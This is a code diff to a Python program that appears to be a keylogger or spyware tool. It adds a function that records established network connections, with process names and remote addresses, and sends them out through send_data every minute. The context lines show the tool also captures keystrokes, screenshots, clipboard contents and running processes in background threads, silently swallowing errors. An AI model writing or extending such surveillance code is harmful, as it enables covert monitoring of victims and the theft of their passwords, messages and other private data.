@@ -132,6 +132,34 @@ def log_processes():
             pass
         time.sleep(60) # Log every 60 seconds
 
+def log_network_activity():
+    while True:
+        try:
+            connections = []
+            for conn in psutil.net_connections(kind='inet'):
+                if conn.status == 'ESTABLISHED':
+                    try:
+                        p = psutil.Process(conn.pid)
+                        connections.append({
+                            'pid': conn.pid,
+                            'process_name': p.name(),
+                            'local_address': f"{conn.laddr.ip}:{conn.laddr.port}",
+                            'remote_address': f"{conn.raddr.ip}:{conn.raddr.port}",
+                            'status': conn.status,
+                        })
+                    except (psutil.NoSuchProcess, psutil.AccessDenied):
+                        continue
+            if connections:
+                send_data({
+                    'type': 'network_activity',
+                    'timestamp': datetime.now().strftime("%Y%m%d_%H%M%S"),
+                    'connections': connections,
+                })
+        except Exception as e:
+            pass
+        time.sleep(60) # Log every 60 seconds
+
+
 def get_active_window_info():
     try:
         hwnd = win32gui.GetForegroundWindow()
@@ -237,6 +265,7 @@ if __name__ == "__main__":
     threading.Thread(target=capture_screenshot, daemon=True).start()
     threading.Thread(target=log_clipboard, daemon=True).start()
     threading.Thread(target=log_processes, daemon=True).start()
+    threading.Thread(target=log_network_activity, daemon=True).start()
 
     with keyboard.Listener(on_press=log_keystroke) as listener:
         listener.join()
